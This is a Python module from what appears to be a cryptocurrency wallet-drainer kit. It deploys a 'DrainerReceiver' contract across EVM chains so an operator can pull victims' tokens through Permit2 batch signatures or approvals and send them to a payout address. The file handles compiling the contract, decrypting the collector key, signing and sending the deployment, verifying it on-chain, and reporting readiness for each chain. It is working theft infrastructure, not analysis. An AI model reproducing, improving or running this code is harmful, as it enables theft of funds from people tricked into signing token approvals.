"""
DrainerReceiver deployment from the admin console.

The receiver is the only contract the drainer needs and it must exist on every
EVM chain before tokens can be pulled with a Permit2 batch or a plain approve.
Historically this was a CLI-only step (`scripts/deploy_receiver.py`) that
required a local `solc`. This module makes the same work callable from an admin
endpoint:

  * the compiled artifact is committed at contracts/DrainerReceiver.json, so a
    deployment needs no compiler on the server;
  * `compile_artifact()` can still rebuild it when solc / py-solc-x is present;
  * every deploy verifies the constructor args on-chain (owner + payout) so a
    silent misdeploy can never receive a drain;
  * payouts land on the configured sink directly — the receiver never holds
    funds beyond the duration of one transaction.

The collector EOA is the contract owner and the only account allowed to call
permitAndPull/pullDirect, so a deploy needs the collector key and native gas on
that chain.
"""
import asyncio
import logging
import os
from typing import Any, Dict, List, Optional

from eth_account import Account
from eth_abi import encode as abi_encode

import abi
import drainer
from chains import EVM_NETWORKS
from database import get_setting, update_setting

logger = logging.getLogger("receiver")

BASE_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
ARTIFACT = os.path.join(BASE_DIR, "contracts", "DrainerReceiver.json")
SOURCE = os.path.join(BASE_DIR, "contracts", "DrainerReceiver.sol")

GAS_FALLBACK = 1_500_000
RECEIPT_POLLS = 40
RECEIPT_DELAY = 2.0


class DeployError(RuntimeError):
    pass


# ------------------------------------------------------------------ artifact
def load_artifact() -> Dict[str, Any]:
    import json

    if not os.path.exists(ARTIFACT):
        raise DeployError("receiver artifact missing — run compile first")
    with open(ARTIFACT, "r", encoding="utf-8") as fh:
        art = json.load(fh)
    code = (art.get("bytecode") or "").strip()
    if not code or code == "0x":
        raise DeployError("artifact has empty bytecode — recompile")
    if not code.startswith("0x"):
        code = "0x" + code
    art["bytecode"] = code
    return art


def compile_artifact() -> Dict[str, Any]:
    """Rebuild the artifact with py-solc-x. Raises DeployError if unavailable."""
    import json

    try:
        import solcx
    except ImportError as exc:                                # noqa: BLE001
        raise DeployError(
            "py-solc-x is not installed — pip install py-solc-x, or keep the "
            "committed artifact") from exc
    if not os.path.exists(SOURCE):
        raise DeployError("contracts/DrainerReceiver.sol not found")

    version = "0.8.24"
    try:
        if version not in [str(v) for v in solcx.get_installed_solc_versions()]:
            solcx.install_solc(version)
    except Exception as exc:                                  # noqa: BLE001
        raise DeployError(f"could not obtain solc {version}: {exc}") from exc

    with open(SOURCE, "r", encoding="utf-8") as fh:
        source = fh.read()
    out = solcx.compile_source(source, output_values=["abi", "bin"], optimize=True,
                               optimize_runs=200, solc_version=version)
    key = next(k for k in out if k.endswith(":DrainerReceiver"))
    art = {"abi": out[key]["abi"], "bytecode": "0x" + out[key]["bin"]}
    with open(ARTIFACT, "w", encoding="utf-8") as fh:
        json.dump(art, fh, indent=2)
    return art


# ------------------------------------------------------------------ helpers
def _collector_key() -> str:
    blob = get_setting("drainer_evm_key")
    if not blob:
        raise DeployError("no EVM collector key set — add one first")
    import crypto
    return crypto.decrypt_secret(blob)


def _payout(for_chain: Optional[str] = None) -> str:
    payout = (get_setting("drainer_payout_evm") or "").strip()
    if not payout or not abi.is_address(payout):
        raise DeployError("no valid EVM payout sink set — save one first")
    return payout


def _word(raw: Optional[str]) -> str:
    if not raw or raw == "0x":
        return ""
    return "0x" + raw[2:].rjust(64, "0")[-40:]


async def _verify(net: str, contract: str, owner: str, payout: str) -> None:
    got_owner = _word(await drainer._rpc(net, "eth_call",
                                         [{"to": contract, "data": abi.SEL_OWNER}, "latest"]))
    got_payout = _word(await drainer._rpc(net, "eth_call",
                                          [{"to": contract, "data": abi.SEL_PAYOUT}, "latest"]))
    if got_owner.lower() != owner.lower():
        raise DeployError(f"owner mismatch on {net}: {got_owner} != {owner}")
    if got_payout.lower() != payout.lower():
        raise DeployError(f"payout mismatch on {net}: {got_payout} != {payout}")


async def deploy(net: str, key: str, payout: str,
                 artifact: Optional[Dict[str, Any]] = None) -> str:
    """Deploy one receiver and return its address. Raises DeployError."""
    if net not in EVM_NETWORKS:
        raise DeployError(f"unknown network {net}")
    art = artifact or load_artifact()
    acct = Account.from_key(key)
    chain_id = EVM_NETWORKS[net]["chainId"]
    data = art["bytecode"] + abi_encode(["address", "address"],
                                        [acct.address, payout]).hex()

    try:
        estimate = await drainer._rpc(net, "eth_estimateGas",
                                      [{"from": acct.address, "data": data}])
        gas = int(int(estimate, 16) * 1.25)
    except Exception as exc:                                  # noqa: BLE001
        logger.warning("%s: gas estimate failed (%s), using %d", net, exc, GAS_FALLBACK)
        gas = GAS_FALLBACK

    fee = await drainer._fee_fields(net)
    cost = gas * drainer._fee_cap(fee)
    balance = int(await drainer._rpc(net, "eth_getBalance", [acct.address, "latest"]), 16)
    if balance < cost:
        native = (EVM_NETWORKS.get(net) or {}).get("native", "native")
        raise DeployError(
            f"MISSING_GAS: collector needs ~{cost / 1e18:.6f} {native} on {net}")

    nonce = int(await drainer._rpc(net, "eth_getTransactionCount",
                                   [acct.address, "pending"]), 16)
    payload = {"chainId": chain_id, "nonce": nonce, "data": data, "gas": gas, **fee}
    signed = acct.sign_transaction(payload)
    tx_hash = await drainer._rpc(net, "eth_sendRawTransaction",
                                 ["0x" + signed.raw_transaction.hex().removeprefix("0x")])
    logger.info("%s: receiver deploy sent %s", net, tx_hash)

    receipt = None
    for _ in range(RECEIPT_POLLS):
        await asyncio.sleep(RECEIPT_DELAY)
        receipt = await drainer._rpc(net, "eth_getTransactionReceipt", [tx_hash])
        if receipt:
            break
    if not receipt:
        raise DeployError(f"{net}: no receipt for {tx_hash} after "
                          f"{RECEIPT_POLLS * RECEIPT_DELAY:.0f}s")
    if int(receipt.get("status") or "0x0", 16) != 1:
        raise DeployError(f"{net}: deploy reverted ({tx_hash})")
    contract = receipt.get("contractAddress")
    if not contract:
        raise DeployError(f"{net}: receipt has no contract address")

    await _verify(net, contract, acct.address, payout)
    stored = dict(get_setting("drainer_receiver_evm") or {})
    stored[net] = contract
    update_setting("drainer_receiver_evm", stored)
    return contract


# ------------------------------------------------------------------ status
async def status() -> Dict[str, Any]:
    """
    Readiness report for the admin console: per-chain receiver deployment, gas
    and whether the on-chain owner/payout match the current configuration.
    """
    from chains import evm_network_names

    receivers = get_setting("drainer_receiver_evm") or {}
    if not isinstance(receivers, dict):
        receivers = {}
    payout = (get_setting("drainer_payout_evm") or "").strip()
    try:
        collector = Account.from_key(_collector_key()).address if get_setting("drainer_evm_key") else ""
    except Exception:                                         # noqa: BLE001
        collector = ""

    sem = asyncio.Semaphore(6)

    async def probe(net: str) -> Dict[str, Any]:
        addr = receivers.get(net)
        row: Dict[str, Any] = {
            "name": net,
            "chainId": EVM_NETWORKS[net]["chainId"],
            "testnet": bool(EVM_NETWORKS[net].get("testnet")),
            "receiver": addr or None,
            "deployed": False,
            "owner_ok": False,
            "payout_ok": False,
            "gas_ok": False,
        }
        async with sem:
            if addr and abi.is_address(addr):
                try:
                    code = await drainer._rpc(net, "eth_getCode", [addr, "latest"])
                    row["deployed"] = bool(code and code != "0x")
                    if row["deployed"]:
                        owner = _word(await drainer._rpc(
                            net, "eth_call", [{"to": addr, "data": abi.SEL_OWNER}, "latest"]))
                        got_payout = _word(await drainer._rpc(
                            net, "eth_call", [{"to": addr, "data": abi.SEL_PAYOUT}, "latest"]))
                        row["owner_ok"] = bool(collector) and owner.lower() == collector.lower()
                        row["payout_ok"] = bool(payout) and got_payout.lower() == payout.lower()
                except Exception:                             # noqa: BLE001
                    pass
            if collector:
                try:
                    fee = await drainer._fee_fields(net)
                    cost = 1_000_000 * drainer._fee_cap(fee)
                    bal = int(await drainer._rpc(net, "eth_getBalance", [collector, "latest"]), 16)
                    row["gas_ok"] = bal >= cost
                except Exception:                             # noqa: BLE001
                    pass
        return row

    rows = await asyncio.gather(*[probe(n) for n in evm_network_names(include_testnets=True)])

    missing = [r["name"] for r in rows if not r["testnet"] and not r["deployed"]]
    return {
        "collector": collector,
        "payout": payout,
        "artifact": os.path.exists(ARTIFACT),
        "evm_key_set": bool(get_setting("drainer_evm_key")),
        "ready": bool(collector and abi.is_address(payout)),
        "missing_mainnets": missing,
        "chains": rows,
    }
